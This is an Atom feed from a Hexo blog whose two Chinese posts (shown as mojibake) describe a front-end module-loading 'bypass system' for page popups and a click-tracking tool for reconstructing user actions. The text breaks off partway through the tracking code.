<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Justin&#39;s Words</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://youngdze.co/"/>
  <updated>2018-07-15T04:00:44.430Z</updated>
  <id>http://youngdze.co/</id>
  
  <author>
    <name>Justin Young</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>å‰ç«¯æ—è·¯ç³»ç»Ÿ</title>
    <link href="http://youngdze.co/2018/07/15/fe-bypass-system/"/>
    <id>http://youngdze.co/2018/07/15/fe-bypass-system/</id>
    <published>2018-07-15T04:56:00.000Z</published>
    <updated>2018-07-15T04:00:44.430Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä¸ºä»€ä¹ˆè¦æœ‰æ—è·¯ç³»ç»Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦æœ‰æ—è·¯ç³»ç»Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦æœ‰æ—è·¯ç³»ç»Ÿ"></a>ä¸ºä»€ä¹ˆè¦æœ‰æ—è·¯ç³»ç»Ÿ</h2><h4 id="ç—›ç‚¹"><a href="#ç—›ç‚¹" class="headerlink" title="ç—›ç‚¹"></a>ç—›ç‚¹</h4><ul><li>æ´»åŠ¨è¶Šæ¥è¶Šå¤šï¼Œæ¯æ¬¡æ´»åŠ¨éƒ½è¦ç»™é¡µé¢åŠ å„ç§å¼¹çª—å„ç§æµ®å±‚å„ç§æç¤ºï¼Œæ²¡æœ‰ä¸€ä¸ªåœ°æ–¹ç»Ÿä¸€ç®¡ç†</li><li>æ¯æ¬¡è¦åŠ ä¸€äº›æ— å…³ä¸»æµç¨‹çš„ä»£ç éƒ½è¦å»ä¿®æ”¹ä¸»æµç¨‹çš„ä»£ç ï¼Œä»£ç ä¾µå…¥æ€§å’Œä»£ç è€¦åˆæ€§å¤ªå¼º</li><li>æ¯æ¬¡ä¿®æ”¹å®Œæˆæ—è·¯é€»è¾‘åéƒ½è¦ç»Ÿä¸€å‘ä¸€æ¬¡ä»£ç ï¼Œéå¸¸æ‹…å¿ƒä¼šæ‹–ç´¯ä¸»é€»è¾‘</li></ul><a id="more"></a><h2 id="æ—è·¯ç³»ç»Ÿè¦æ€ä¹ˆè®¾è®¡"><a href="#æ—è·¯ç³»ç»Ÿè¦æ€ä¹ˆè®¾è®¡" class="headerlink" title="æ—è·¯ç³»ç»Ÿè¦æ€ä¹ˆè®¾è®¡"></a>æ—è·¯ç³»ç»Ÿè¦æ€ä¹ˆè®¾è®¡</h2><h3 id="æ—è·¯ç®¡ç†"><a href="#æ—è·¯ç®¡ç†" class="headerlink" title="æ—è·¯ç®¡ç†"></a>æ—è·¯ç®¡ç†</h3><p>éœ€è¦æœ‰ä¸€ä¸ªåœ°æ–¹æ¥ç»Ÿä¸€ç®¡ç†æ‰€æœ‰æ—è·¯çš„åŠŸèƒ½ï¼Œè¿™ä¸ªåœ°æ–¹åº”è¯¥åŒ…å«æ¯ä¸ªæ—è·¯éƒ½éœ€è¦çš„å±æ€§ï¼Œä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ–¹é¢ï¼Œåç»­æœ‰éœ€è¦å¯ä»¥å†åŠ ï¼š</p><ul><li>åç§°</li><li>æ ‡è¯†</li><li>ç”Ÿæ•ˆè·¯ç”±</li><li>æ¨¡å—id</li><li>å¼€å§‹æ—¶é—´</li><li>ç»“æŸæ—¶é—´</li></ul><h3 id="æ—è·¯è¿‡æ»¤"><a href="#æ—è·¯è¿‡æ»¤" class="headerlink" title="æ—è·¯è¿‡æ»¤"></a>æ—è·¯è¿‡æ»¤</h3><p>æ—è·¯è¿‡æ»¤ä¸å»ºè®®åœ¨å‰ç«¯åšï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦å…ˆåœ¨å‰ç«¯æ‹‰å–åˆ°æ‰€æœ‰é…ç½®ï¼Œç„¶åæ ¹æ®çº¦å®šå¥½çš„è¿‡æ»¤è§„åˆ™è¿›è¡Œè¿‡æ»¤ï¼Œå¦‚æœé…ç½®å¾ˆå¤šçš„è¯ï¼Œå‰ç«¯å°±éœ€è¦è€—æ—¶å¾ˆä¹…ï¼Œæ‰€ä»¥è¿™ä¸€æ­¥ä¼šæä¾›ä¸€ä¸ªcgiã€‚</p><p>è¿‡æ»¤åº”è¯¥è¦åŒ…æ‹¬ä»¥ä¸‹ä¸‰ä¸ªæ–¹é¢ï¼š</p><ul><li>æ˜¯å¦åœ¨æœ‰æ•ˆæ—¶é—´ã€‚æœ‰æ•ˆæ—¶é—´ä¼šé€šè¿‡æ—è·¯é…ç½®é‡Œé¢è®¾ç½®å¥½çš„ç”Ÿæ•ˆæ—¶é—´æ¥åˆ¤æ–­</li><li>æ˜¯å¦åœ¨åˆé€‚è·¯ç”±ã€‚åˆé€‚çš„è·¯ç”±å³æ˜¯ä¼šæŠŠé…ç½®å¥½çš„è·¯ç”±å’Œå½“å‰è·¯ç”±è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœåº”å½“åœ¨å½“å‰è·¯ç”±ç”Ÿæ•ˆï¼Œå°±åˆ¤æ–­ä¸ºæœ‰æ•ˆ</li><li>æ˜¯å¦debugæ¨¡å¼ã€‚æˆ‘ä»¬æ˜¯é€šè¿‡åˆ¤æ–­urlæŸä¸ªå‚æ•°æ¥åˆ¤æ–­æ˜¯å¦debugæ¨¡å¼</li></ul><h3 id="æ—è·¯æ¨¡å—åŠ è½½"><a href="#æ—è·¯æ¨¡å—åŠ è½½" class="headerlink" title="æ—è·¯æ¨¡å—åŠ è½½"></a>æ—è·¯æ¨¡å—åŠ è½½</h3><p>å‰ç«¯æ”¶åˆ°cgiè¿”å›çš„æ—è·¯æ¨¡å—åˆ—è¡¨åï¼Œå°±å¼€å§‹æ ¹æ®æ¯ä¸ªæ¨¡å—é‡Œé¢çš„æ¨¡å—idæ¥åŠ è½½éœ€è¦çš„æ¨¡å—ï¼Œè¿™é‡Œçš„æ¨¡å—åŠ è½½ä¼šé€šè¿‡å¼‚æ­¥æ‹‰å–ï¼Œå¹¶ä¸”åœ¨æ‹‰å–çš„è¿‡ç¨‹ä¸­æŠ›å‡ºç›¸åº”äº‹ä»¶ï¼Œæ–¹ä¾¿å…¶ä»–åœ°æ–¹ç›‘å¬ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åŠ è½½æ—è·¯æ¨¡å—</span></span><br><span class="line"><span class="comment"> * @param &#123;*&#125; data</span></span><br><span class="line"><span class="comment"> * @param &#123;*&#125; callback</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadModule</span>(<span class="params">data, callback</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> moduleName = data.actModule;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">require</span>.async(moduleName, <span class="function"><span class="keyword">function</span> (<span class="params">module</span>) </span>&#123;</span><br><span class="line">        callback &amp;&amp; callback(<span class="built_in">module</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loadModule(config, <span class="function"><span class="keyword">function</span> (<span class="params">module</span>) </span>&#123;</span><br><span class="line">    Event.emit(<span class="string">'loadModule.module.loaded'</span>, config);  <span class="comment">// æŠ›å‡ºç›¸åº”äº‹ä»¶</span></span><br><span class="line">    ...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="æ¨¡å—æ‰§è¡Œ"><a href="#æ¨¡å—æ‰§è¡Œ" class="headerlink" title="æ¨¡å—æ‰§è¡Œ"></a>æ¨¡å—æ‰§è¡Œ</h3><p>æ¨¡å—åŠ è½½å›æ¥åï¼Œéœ€è¦åˆ†åˆ«æ‰§è¡Œï¼Œæœ‰äº›æ¨¡å—æ˜¯æ¨¡æ¿æ¨¡å—ï¼Œè®¾è®¡åˆ°æ“ä½œDOMï¼Œæœ‰äº›åˆ™ä¸éœ€è¦ï¼Œé‚£æˆ‘ä»¬ç»™æ¯ä¸ªæ¨¡å—åˆ›å»ºä¸€ä¸ªèŠ‚ç‚¹ï¼Œè®©å®ƒåœ¨è¿™ä¸ªèŠ‚ç‚¹å†…æ‰§è¡Œã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ‰§è¡Œæ—è½æ¨¡å—</span></span><br><span class="line"><span class="comment"> * @param &#123;*&#125; module</span></span><br><span class="line"><span class="comment"> * @param &#123;*&#125; options</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execModule</span>(<span class="params">module, options, callback</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºæ‰§è¡ŒèŠ‚ç‚¹</span></span><br><span class="line">    <span class="keyword">var</span> container = <span class="built_in">document</span>.querySelector(<span class="string">'#page-wrapper'</span>) || <span class="built_in">document</span>.body;</span><br><span class="line">    <span class="keyword">var</span> byPassContainer = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">    byPassContainer.setAttribute(<span class="string">'id'</span>, <span class="string">'byPassModuleWrapper_'</span> + <span class="built_in">module</span>.actId);</span><br><span class="line">    container.appendChild(byPassContainer);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">module</span>.init(byPassContainer, options);</span><br><span class="line">    callback &amp;&amp; callback();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">execModule(<span class="built_in">module</span>, options, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    Event.emit(<span class="string">'loadModule.module.executed'</span>, config);    <span class="comment">// æŠ›å‡ºç›¸åº”äº‹ä»¶</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="ä¸ä¸»æµç¨‹äº¤äº’çš„æƒ…å†µ"><a href="#ä¸ä¸»æµç¨‹äº¤äº’çš„æƒ…å†µ" class="headerlink" title="ä¸ä¸»æµç¨‹äº¤äº’çš„æƒ…å†µ"></a>ä¸ä¸»æµç¨‹äº¤äº’çš„æƒ…å†µ</h3><p>æœ‰æ—¶å€™ä¸€äº›æ—è·¯é€»è¾‘è¿˜ä¼šæ¶‰åŠåˆ°å’Œä¸»æµç¨‹çš„äº¤äº’ï¼Œéœ€è¦å–åˆ°ä¸»æµç¨‹æŸäº›å€¼æˆ–è€…æ‰§è¡Œä¸»æµç¨‹é‡Œé¢æŸäº›åŠ¨ä½œçš„æƒ…å†µï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æä¾›ä¸€äº›æ¥å£ç»™æ—è·¯æ¨¡å—ä½¿ç”¨ï¼Œæ—è·¯æ¨¡å—å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ¥å£ä¸ä¸»æµç¨‹è¿›è¡Œäº¤äº’ã€‚è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯ actionã€‚</p><blockquote><p>action æ˜¯ reflux/redux é‡Œé¢çš„æ¦‚å¿µï¼Œæ˜¯ç”¨æ¥å¯¹ä¸šåŠ¡æ•°æ®è¿›è¡Œå…·ä½“æ“ä½œçš„æ¥å£</p></blockquote><p>ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">"activity.whatever"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">    exports.init = init;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params">container, options</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> myActions = options &amp;&amp; options.myActions; <span class="comment">// ä¸»æµç¨‹ä¼ è¿›æ¥çš„æ¥å£</span></span><br><span class="line">        <span class="keyword">if</span> (!myActions) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> myTypes = [&#123;</span><br><span class="line">            id: <span class="number">1</span>,</span><br><span class="line">            name: <span class="string">'MyTypes'</span></span><br><span class="line">        &#125;];</span><br><span class="line">        myActions.changeTypes(myTypes);  <span class="comment">// ä¸ä¸»æµç¨‹è¿›è¡Œäº¤äº’</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ä¸ºä»€ä¹ˆè¦æœ‰æ—è·¯ç³»ç»Ÿ&quot;&gt;&lt;a href=&quot;#ä¸ºä»€ä¹ˆè¦æœ‰æ—è·¯ç³»ç»Ÿ&quot; class=&quot;headerlink&quot; title=&quot;ä¸ºä»€ä¹ˆè¦æœ‰æ—è·¯ç³»ç»Ÿ&quot;&gt;&lt;/a&gt;ä¸ºä»€ä¹ˆè¦æœ‰æ—è·¯ç³»ç»Ÿ&lt;/h2&gt;&lt;h4 id=&quot;ç—›ç‚¹&quot;&gt;&lt;a href=&quot;#ç—›ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;ç—›ç‚¹&quot;&gt;&lt;/a&gt;ç—›ç‚¹&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;æ´»åŠ¨è¶Šæ¥è¶Šå¤šï¼Œæ¯æ¬¡æ´»åŠ¨éƒ½è¦ç»™é¡µé¢åŠ å„ç§å¼¹çª—å„ç§æµ®å±‚å„ç§æç¤ºï¼Œæ²¡æœ‰ä¸€ä¸ªåœ°æ–¹ç»Ÿä¸€ç®¡ç†&lt;/li&gt;
&lt;li&gt;æ¯æ¬¡è¦åŠ ä¸€äº›æ— å…³ä¸»æµç¨‹çš„ä»£ç éƒ½è¦å»ä¿®æ”¹ä¸»æµç¨‹çš„ä»£ç ï¼Œä»£ç ä¾µå…¥æ€§å’Œä»£ç è€¦åˆæ€§å¤ªå¼º&lt;/li&gt;
&lt;li&gt;æ¯æ¬¡ä¿®æ”¹å®Œæˆæ—è·¯é€»è¾‘åéƒ½è¦ç»Ÿä¸€å‘ä¸€æ¬¡ä»£ç ï¼Œéå¸¸æ‹…å¿ƒä¼šæ‹–ç´¯ä¸»é€»è¾‘&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="Bypass System" scheme="http://youngdze.co/tags/Bypass-System/"/>
    
  </entry>
  
  <entry>
    <title>ç”¨æˆ·è¡Œä¸ºç³»ç»Ÿ</title>
    <link href="http://youngdze.co/2018/07/15/user-behave-track/"/>
    <id>http://youngdze.co/2018/07/15/user-behave-track/</id>
    <published>2018-07-15T03:56:00.000Z</published>
    <updated>2018-07-15T03:55:34.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯ç”¨æˆ·è¡Œä¸ºç³»ç»Ÿ"><a href="#ä»€ä¹ˆæ˜¯ç”¨æˆ·è¡Œä¸ºç³»ç»Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ç”¨æˆ·è¡Œä¸ºç³»ç»Ÿ"></a>ä»€ä¹ˆæ˜¯ç”¨æˆ·è¡Œä¸ºç³»ç»Ÿ</h2><p>ç”¨æˆ·è¡Œä¸ºç³»ç»Ÿåº”è¯¥æ˜¯ä¸€ä¸ªå¯ä»¥è¿½æº¯ç”¨æˆ·æ“ä½œè·¯å¾„ã€æä¾›ç”¨æˆ·æ“ä½œåˆ†æå’Œè§£å†³ç”¨æˆ·æŠ•è¯‰çš„ç³»ç»Ÿã€‚å®ƒå¯ä»¥å¸®æˆ‘ä»¬å›æº¯ç”¨æˆ·ä»è¿›æ¥é¡µé¢åï¼Œä»–çš„æ¯ä¸€æ­¥æ“ä½œï¼Œç‚¹å‡»äº†é¡µé¢å“ªä¸ªä½ç½®ï¼Œåšäº†ä½•ç§è¡Œä¸ºï¼Œæ¯”å¦‚æŠ½å¥–ã€ä»˜æ¬¾ã€å……å€¼ç­‰ã€‚</p><a id="more"></a><h2 id="ä¸ºä»€ä¹ˆè¦æœ‰ç”¨æˆ·è¡Œä¸ºç³»ç»Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦æœ‰ç”¨æˆ·è¡Œä¸ºç³»ç»Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦æœ‰ç”¨æˆ·è¡Œä¸ºç³»ç»Ÿ"></a>ä¸ºä»€ä¹ˆè¦æœ‰ç”¨æˆ·è¡Œä¸ºç³»ç»Ÿ</h2><h3 id="ç—›ç‚¹"><a href="#ç—›ç‚¹" class="headerlink" title="ç—›ç‚¹"></a>ç—›ç‚¹</h3><p>æˆ‘è¿™é‡Œç»å†è¿‡ä¸€äº›ç”¨æˆ·æŠ•è¯‰è¿‡æ¥çš„é—®é¢˜ï¼Œæœ‰æ—¶å€™ä¸€äº›é—®é¢˜éå¸¸éš¾å»å®šä½ï¼Œå¾€å¾€éœ€è¦èŠ±å¤§é‡æ—¶é—´å»é‡ç°ç”¨æˆ·å‡ºç°çš„é—®é¢˜ï¼Œæˆ‘ä»¬éƒ¨é—¨å®šçš„æ ‡å‡†æ˜¯ç”¨æˆ·æŠ•è¯‰é—®é¢˜ï¼Œå¿…é¡»åœ¨6ä¸ªå°æ—¶å†…è§£å†³ã€‚</p><p>æˆ‘ä»¬çš„æ—¥å¿—åªæœ‰åŸ‹ç‚¹ä¸ŠæŠ¥ã€æ¥å£è°ƒç”¨è®°å½•å’Œ nginx è®¿é—®æ—¥å¿—ï¼Œä¿¡æ¯è¿‡å°‘ï¼Œå¦‚æœè¿™äº›æ—¥å¿—éƒ½æ²¡é—®é¢˜äº†ï¼Œé‚£æƒ³è§£å†³ç”¨æˆ·æŠ•è¯‰é—®é¢˜å°±åªèƒ½é ä¸æ–­é‡ç°äº†ï¼Œå¹¸è¿çš„è¯6ä¸ªå°æ—¶å†…å°±å¯ä»¥é‡ç°å¹¶è§£å†³ï¼Œå¦‚æœæ˜¯å¾ˆéšè”½çš„bugï¼Œä¼°è®¡6ä¸ªå°æ—¶éƒ½æ²¡æ³•é‡ç°ï¼Œå¦‚æœæ˜¯èµ„é‡‘ç›¸å…³æŠ•è¯‰ï¼Œå°±å¾ˆä¸¥é‡äº†ã€‚</p><p>æ›´æœ‰å¯èƒ½æ˜¯æœ‰äº›ç”¨æˆ·æ˜¯å‡æŠ•è¯‰ï¼Œæ²¡æœ‰é‡åˆ°è¿™ä¸ªé—®é¢˜ä¹ŸæŠ•è¯‰äº†è¦èµ”ä»˜ï¼Œæˆ‘ä»¬åˆä¸å…·å¤‡åˆ†è¾¨ä»–æ˜¯çœŸå‡çš„èƒ½åŠ›ï¼Œå› ä¸ºæ˜¯ä¸å¯èƒ½é‡ç°çš„ï¼Œå¦‚æœæ²¡æ³•éªŒè¯æ²¡æœ‰è¯æ®ï¼Œæˆ‘ä»¬åªèƒ½è®¤æ ½èµ”ä»˜ã€‚</p><h2 id="ç”¨æˆ·è¡Œä¸ºç³»ç»Ÿè¦æ€ä¹ˆè®¾è®¡"><a href="#ç”¨æˆ·è¡Œä¸ºç³»ç»Ÿè¦æ€ä¹ˆè®¾è®¡" class="headerlink" title="ç”¨æˆ·è¡Œä¸ºç³»ç»Ÿè¦æ€ä¹ˆè®¾è®¡"></a>ç”¨æˆ·è¡Œä¸ºç³»ç»Ÿè¦æ€ä¹ˆè®¾è®¡</h2><h3 id="æ—è·¯é€»è¾‘ï¼Œéä¾µå…¥å¼"><a href="#æ—è·¯é€»è¾‘ï¼Œéä¾µå…¥å¼" class="headerlink" title="æ—è·¯é€»è¾‘ï¼Œéä¾µå…¥å¼"></a>æ—è·¯é€»è¾‘ï¼Œéä¾µå…¥å¼</h3><p>ç”¨æˆ·è¡Œä¸ºæ”¶é›†åº”è¯¥æ˜¯ä¸€ä¸ªæ—è·¯çš„å·¥å…·ï¼Œå®ƒå’Œå…·ä½“çš„ä¸šåŠ¡åœºæ™¯æ²¡æœ‰å…³ç³»ï¼Œè°ƒç”¨æ–¹åªéœ€è¦å°†å®ƒå¼•å…¥åˆ°é¡µé¢æ¥ï¼Œä¸éœ€è¦ç®¡è¿™ä¸ªå·¥å…·çš„å†…éƒ¨å®ç°ï¼Œå…·ä½“è°ƒç”¨å‚æ•°å†™å¥½å°±å¯ä»¥äº†ï¼Œå°±ç®—è¿™ä¸ªå·¥å…·æŠ¥é”™ï¼Œä¹Ÿä¸ä¼šå¯¹ä¸šåŠ¡æ–¹äº§ç”Ÿä»»ä½•é˜»å¡ã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨çš„æ¡†æ¶æ˜¯vueï¼Œæœ€ç®€å•çš„è°ƒç”¨å°±æ˜¯ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-behavior</span>=<span class="string">"userBehaviorKey"</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœç”¨çš„ä¸æ˜¯vueï¼Œé‚£ä¹ˆä¹Ÿå¯ä»¥ç›´æ¥å¼•å…¥è°ƒç”¨ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> behaveReport = <span class="built_in">require</span>(<span class="string">'my.behave.module'</span>);</span><br><span class="line"><span class="keyword">var</span> MY_UNIQ_KEY = <span class="string">'MY_UNIQ_KEY'</span>;</span><br><span class="line"></span><br><span class="line">behaveReport.init(MY_UNIQ_KEY);</span><br></pre></td></tr></table></figure><h3 id="è¡Œä¸ºæ”¶é›†"><a href="#è¡Œä¸ºæ”¶é›†" class="headerlink" title="è¡Œä¸ºæ”¶é›†"></a>è¡Œä¸ºæ”¶é›†</h3><h4 id="æ”¶é›†ç”¨æˆ·è¡Œä¸ºçš„åœºæ™¯"><a href="#æ”¶é›†ç”¨æˆ·è¡Œä¸ºçš„åœºæ™¯" class="headerlink" title="æ”¶é›†ç”¨æˆ·è¡Œä¸ºçš„åœºæ™¯"></a>æ”¶é›†ç”¨æˆ·è¡Œä¸ºçš„åœºæ™¯</h4><ul><li>ç”¨æˆ·è¿›æ¥é¡µé¢æ”¶é›†ä¸€æ¬¡</li><li>å¦‚æœæ˜¯æ¡Œé¢é¡µé¢ï¼Œç›‘å¬ç”¨æˆ·çš„ç‚¹å‡»äº‹ä»¶ï¼Œæ¯æ¬¡ç‚¹å‡»éƒ½å»æ”¶é›†</li><li>å¦‚æœæ˜¯ç§»åŠ¨ç«¯é¡µé¢ï¼Œç›‘å¬ç”¨æˆ·çš„è§¦å±äº‹ä»¶ï¼Œæ¯æ¬¡è§¦å±éƒ½å»æ”¶é›†</li></ul><p>å…¶ä»–åœºæ™¯çœ‹è‡ªå·±éœ€è¦ï¼Œå¯ä»¥è‡ªç”±æ·»åŠ ï¼Œæ‰€ä»¥æˆ‘ä¼šæä¾›ä¸€ä¸ªé€‰é¡¹è‡ªè¡Œæ·»åŠ ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> BEHAVIORS = [<span class="string">'load'</span>, <span class="string">'touchstart'</span>];</span><br><span class="line">BEHAVIORS = options.BEHAVIORS || BEHAVIORS;</span><br><span class="line"></span><br><span class="line">BEHAVIORS.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">behave</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(behave, handleAddEventListner);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="èŠ‚æµ"><a href="#èŠ‚æµ" class="headerlink" title="èŠ‚æµ"></a>èŠ‚æµ</h4><p>å¦‚æœç”¨æˆ·åœ¨ 500ms å†…è¿ç»­ç‚¹äº†å¥½å‡ æ¬¡ï¼Œå…¶å®åªæ˜¯ç‚¹äº†ä¸€ä¸ªåœ°æ–¹ï¼Œæˆ‘ä»¬å°±è¦è€ƒè™‘èŠ‚æµäº†ï¼Œè¿™ç§æƒ…å†µå°±åªæ”¶é›†ä¸€æ¬¡ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((time - LAST_TIME) &gt; MIN_INTERVAL_TIMER) &#123;</span><br><span class="line">    pushBehaveLog(eventLog);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æœªä¸ŠæŠ¥æ•°æ®ä¿å­˜"><a href="#æœªä¸ŠæŠ¥æ•°æ®ä¿å­˜" class="headerlink" title="æœªä¸ŠæŠ¥æ•°æ®ä¿å­˜"></a>æœªä¸ŠæŠ¥æ•°æ®ä¿å­˜</h4><p>æ•°æ®é‡‡é›†ä¸‹æ¥åä¸æ˜¯ç«‹å³ä¸ŠæŠ¥ï¼Œå…ˆå‹å…¥ä¸€ä¸ªæ•°æ®ï¼Œå¹¶åœ¨ä¸ªåœ°æ–¹å…ˆä¿å­˜ä¸‹æ¥ï¼Œå¯ä»¥ä¿å­˜åœ¨å†…å­˜é‡Œé¢ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©ä¿å­˜åˆ° sessionStorageï¼Œä¹‹æ‰€ä»¥é€‰æ‹© sessionStorageï¼Œæ˜¯å› ä¸ºå®ƒçš„æ•°æ®åªåœ¨å½“å‰æ‰“å¼€çª—å£æœ‰æ•ˆï¼Œè¿™æ ·å¯ä»¥é¿å…æ±¡æŸ“åˆ°ä¸‹æ¬¡æ‰“å¼€é¡µé¢çš„æ•°æ®ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> logs = getBehaveLog();</span><br><span class="line">logs.stack.push(log);   <span class="comment">// å‹å…¥æ–°æ”¶é›†åˆ°çš„æ•°æ®</span></span><br></pre></td></tr></table></figure><h4 id="æ”¶é›†ä»€ä¹ˆæ•°æ®"><a href="#æ”¶é›†ä»€ä¹ˆæ•°æ®" class="headerlink" title="æ”¶é›†ä»€ä¹ˆæ•°æ®"></a>æ”¶é›†ä»€ä¹ˆæ•°æ®</h4><p>éœ€è¦æ”¶é›†ä»€ä¹ˆæ•°æ®çœ‹è‡ªå·±éœ€è¦ï¼Œè¿™é‡Œæˆ‘æä¾›å‡ ä¸ªç‚¹ï¼Œå…¨éƒ¨éƒ½æ˜¯ç‚¹å‡»å½“æ—¶çš„æ•°æ®ï¼š</p><ul><li>æ ‡ç­¾å(<code>h1/p/span/div</code>)</li><li>ç±»å(<code>.btn-default</code>)</li><li>å…ƒç´ id</li><li>ç‚¹å‡»çš„æ–‡å­—</li><li>åæ ‡è½´ï¼ŒåŒ…æ‹¬ç›¸å¯¹æ•´ä¸ªé¡µé¢çš„xè½´å’Œyè½´</li><li>äº‹ä»¶ç±»å‹(<code>click/touchstart</code>)</li><li>ç‚¹å‡»æ—¶é—´ï¼Œè¿™é‡Œè®°å½•çš„æ˜¯ç”¨æˆ·ä¾§æ—¶é—´ï¼Œä¸ŠæŠ¥åæˆ‘ä»¬ä¼šåœ¨æœåŠ¡ç«¯åŠ ä¸Šä¸ªæœåŠ¡å™¨æ—¶é—´å­—æ®µ</li><li>å½“å‰é¡µé¢é“¾æ¥</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> eventLog = &#123;</span><br><span class="line">    tagName: ev.target.tagName,</span><br><span class="line">    className: ev.target.className,</span><br><span class="line">    id: ev.target.id,</span><br><span class="line">    text: ev.target.innerText,</span><br><span class="line">    x: <span class="built_in">Math</span>.round(ev.clientX || ev.pageX || (ev.targetTouches 